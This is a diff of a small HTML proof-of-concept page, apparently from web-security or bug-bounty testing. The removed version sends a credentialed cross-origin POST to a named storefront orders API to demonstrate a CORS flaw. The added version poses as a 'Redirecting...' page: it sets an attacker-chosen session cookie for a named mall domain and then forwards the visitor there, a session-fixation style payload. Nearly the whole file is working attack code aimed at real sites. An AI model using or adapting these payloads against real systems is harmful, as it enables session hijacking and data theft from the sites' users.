@@ -1,39 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit</title>
+<html>
+  <head>
+    <title>Redirecting...</title>
     <script>
-        fetch('https://storefront.points.com/api/orders/buys', {
-            method: 'POST',  // Using POST to demonstrate the CORS vulnerability with a POST request
-            credentials: 'include',  // Include cookies from the victim's session
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                // Sample payload; it doesn't matter if this is real or not for demonstration purposes
-                "error": {
-                    "message": "CORS Exploit Test",
-                    "stack": "Testing CORS vulnerability"
-                }
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                return response.text();  // Assuming the response is text or JSON
-            } else {
-                alert('CORS exploit failed: ' + response.statusText);  // Alert on failure
-            }
-        })
-        .then(data => {
-            alert('Response Data: ' + data);  // Alert any returned data
-        })
-        .catch(error => alert('Error: ' + error));  // Alert any errors
+      // Set the session cookie for the target domain
+      document.cookie = "rewardall675=hacker123; domain=mall.brmile.com; path=/";
+      // Redirect to the target site
+      window.location.href = "https://mall.brmile.com";
     </script>
-</head>
-<body>
-    <h1>CORS Exploit Demonstration</h1>
-    <p>If successful, the response from the vulnerable site will be shown in an alert.</p>
-</body>
+  </head>
+  <body>
+    <p>If you are not redirected automatically, <a href="https://mall.brmile.com">click here</a>.</p>
+  </body>
 </html>
